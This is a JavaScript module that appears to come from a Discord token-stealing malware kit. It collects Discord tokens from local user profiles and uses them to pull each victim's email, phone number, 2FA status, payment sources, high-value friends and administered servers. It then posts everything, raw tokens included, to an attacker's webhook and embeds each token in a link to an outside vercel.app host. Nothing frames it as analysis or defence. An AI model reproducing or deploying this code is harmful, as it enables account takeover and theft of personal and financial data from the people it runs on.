const {
    webhook 
} = require('../../utils/request/webhook.js');

const { 
    getUsers 
} = require("./../../utils/harware/getUsers.js");

const { 
    discordFindTokens 
} = require('./finds.js');

const axios = require("axios");

const getRareFlags = (flags) => {
    const flagsDict = {
        '<:DiscordEmloyee:1163172252989259898>': 0,
        '<:PartneredServerOwner:1163172304155586570>': 1,
        '<:HypeSquadEvents:1163172248140660839>': 2,
        '<:BugHunterLevel1:1163172239970140383>': 3,
        '<:EarlySupporter:1163172241996005416>': 9,
        '<:BugHunterLevel2:1163172238942543892>': 14,
        '<:EarlyBotDeveloper:1163172236807639143>': 17,
        '<:CertifiedModerator:1163172255489085481>': 18,
        '<:ActiveDeveloper:1163172534443851868>': 22
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji + ' ';
        }
    }

    return result.trim();
}

const getHQFriends = (friends) => {
    const filteredFriends = friends
        .filter(friend => friend.type === 1)
        .map(friend => ({
            username: friend.user.username,
            discriminator: friend.user.discriminator,
            flags: getRareFlags(friend.user.public_flags)
        }))

    let hQFriends = filteredFriends.map(friend => {
        const name = `${friend.username}#${friend.discriminator}`;
        if(friend.flags) {
            return `${friend.flags} | ${name}\n`
        }
    });

    hQFriends = hQFriends.join('');

    if (hQFriends.length === 0) {
        return false;
    }

    if (hQFriends.length > 1000) {
        hQFriends = "Too many friends to display.";
    }

    return `**Rare Friends:**\n${hQFriends}`;
};

const getHQGuilds = async (guilds, token) => {
    const filteredGuilds = guilds
        .filter(guild => guild.owner || (guild.permissions & 8) === 8)
        .filter(guild => guild.approximate_member_count >= 500)
        .map(guild => ({
            id: guild.id,
            name: guild.name,
            owner: guild.owner,
            member_count: guild.approximate_member_count
        }));

    let hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
        const response = await axios.get(`https://discord.com/api/v8/guilds/${guild.id}/invites`, {
            headers: { Authorization: token }
        });

        const invites = response.data;
        const invite = invites.length > 0
            ? `[Join Server](https://discord.gg/${invites[0].code})`
            : 'No Invite';

        const emoji = guild.owner
            ? `<:Owner:963333541343686696> Owner`
            : `<:Staff:1136740017822253176> Admin`;
        const members = `Members: \`${guild.member_count}\``;
        const name = `**${guild.name}** - (${guild.id})`;

        return `${emoji} | ${name} - ${members} - ${invite}\n`;
    }));

    hQGuilds = hQGuilds.join('')

    if (hQGuilds.length === 0) {
        return false;
    }

    if (hQGuilds.length > 1000) {
        hQGuilds = "Too many servers to display.";
    }

    return `**Rare Servers:**\n${hQGuilds}`;
}

const getBilling = (billing) => {
    const payment = {
        1: '💳',
        2: '<:Paypal:1129073151746252870>'
    };
    let paymentMethods = billing.map(method => payment[method.type] || '❓').join('');
    return paymentMethods || '`❓`';
}

const getDate = (current, months) => {
    return new Date(current).setMonth(current.getMonth() + months);
};

const getNitro = (flags) => {
    const monthsNitro = [
        "<:DiscordBoostNitro1:1087043238654906472> ",
        "<:DiscordBoostNitro2:1087043319227494460> ",
        "<:DiscordBoostNitro3:1087043368250511512> ",
        "<:DiscordBoostNitro6:1087043493236592820> ",
        "<:DiscordBoostNitro9:1087043493236592820> ",
        "<:DiscordBoostNitro12:1162420359291732038> ",
        "<:DiscordBoostNitro15:1051453775832961034> ",
        "<:DiscordBoostNitro18:1051453778127237180> ",
        "<:DiscordBoostNitro24:1051453776889917530> ",
    ];

    const { premium_type, premium_guild_since } = flags,
        nitro = "<:DiscordNitro:587201513873473542>";
    switch (premium_type) {
        default:
            return '`❓`';
        case 1:
            return nitro;
        case 2:
            if (!premium_guild_since) return nitro;
            let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
                rem = 0;
            for (let i = 0; i < months.length; i++)
                if (Math.round((getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
                    rem = i;
                    break;
                }
            return `${nitro} ${monthsNitro[rem]}`;
    }
};

const getFlags = (flags) => {
    const flagsDict = {
        '<:DiscordEmloyee:1163172252989259898>': 0,
        '<:PartneredServerOwner:1163172304155586570>': 1,
        '<:HypeSquadEvents:1163172248140660839>': 2,
        '<:BugHunterLevel1:1163172239970140383>': 3,
        '<:HouseBravery:1163172246492287017>': 6,
        '<:HouseBrilliance:1163172244474822746>': 7,
        '<:HouseBalance:1163172243417858128>': 8,
        '<:EarlySupporter:1163172241996005416>': 9,
        '<:BugHunterLevel2:1163172238942543892>': 14,
        '<:EarlyBotDeveloper:1163172236807639143>': 17,
        '<:CertifiedModerator:1163172255489085481>': 18,
        '⌨️': 20,
        '<:ActiveDeveloper:1163172534443851868>': 22
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji;
        }
    }

    return result.trim() || '`❓`';
}


const fetch = async (endpoint, headers)  => {
    const response = await axios.get(`https://discord.com/api/v9/users/${endpoint}`, { 
        headers: {
            'Content-Type': 'application/json',
            ...headers
        }
    });

    return response.data;
}

module.exports = async (webhookUrl) => {
    const users = await getUsers();
    for (const user of users) {
        const tokens = await discordFindTokens(user);
        for (let token of tokens) {
            try {
                let user = await fetch('@me', { 
                    'Authorization': token 
                }),

                profile = await fetch(`${Buffer.from(token.split(".")[0], "base64").toString("binary")}/profile`, { 
                    'Authorization': token 
                }),

                billing = await fetch(`@me/billing/payment-sources`, { 
                    'Authorization': token 
                }),
                
                guilds = await fetch(`@me/guilds?with_counts=true`, { 
                    'Authorization': token 
                }),
                
                friends = await fetch(`@me/relationships`, { 
                    'Authorization': token 
                });

                const avatarUrlGif = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.gif`;
                const avatarUrlPng = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;

                let avatar;
                if(user.avatar) {
                    try {
                        const avatarResponse = await axios.get(avatarUrlGif);
                        if (avatarResponse.status === 200) {
                            avatar = avatarUrlGif;
                        }
                    } catch (error) {
                        avatar = avatarUrlPng
                    }
                } else {
                    avatar = `https://cdn.discordapp.com/embed/avatars/${Math.round(Math.random() * 5)}.png`
                }

                let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;

                const data = {
                    embeds: [
                        {
                            title: `${user.username} | ${user.id}`,
                            thumbnail: {
                                url: avatar + '?size=512'
                            },
                            fields: [
                                {
                                    name: "<a:hearts:1176516454540116090> Token:",
                                    value: `\`\`\`\n${token}\n\`\`\`\n[[Click Here To Copy Your Token]](${copy})`,
                                    inline: false
                                },
                                { name: "\u200b", value: "\u200b", inline: false },
                                {
                                    name: "Nitro:",
                                    value: getNitro(profile),
                                    inline: true
                                },
                                {
                                    name: "Phone:",
                                    value: `\`${user.phone || '❓'}${user.mfa_enabled ? ' (2FA)' : ''}\``,
                                    inline: true
                                },
                                { name: "\u200b", value: "\u200b", inline: false },
                                {
                                    name: "Email:",
                                    value: `\`${user.email || '❓'}\``,
                                    inline: true
                                },
                                {
                                    name: "Badges:",
                                    value: getFlags(user.public_flags),
                                    inline: true
                                },
                                {
                                    name: "Billing:",
                                    value: getBilling(billing),
                                    inline: true
                                }
                            ]
                        }
                    ]
                };

                const hqGuilds = await getHQGuilds(guilds, token);
                if (hqGuilds) {
                    data.embeds[0].fields.push({
                        name: "\u200b",
                        value: hqGuilds,
                        inline: false
                    });
                }

                const hqFriends = getHQFriends(friends);
                if (hqFriends) {
                    data.embeds[0].fields.push({
                        name: "\u200b",
                        value: hqFriends,
                        inline: false
                    });
                }

                await webhook(webhookUrl, data, [], copy)
            } catch (error) {
                console.error('Error sending webhookUrl:', error);
            }
        }
    }
}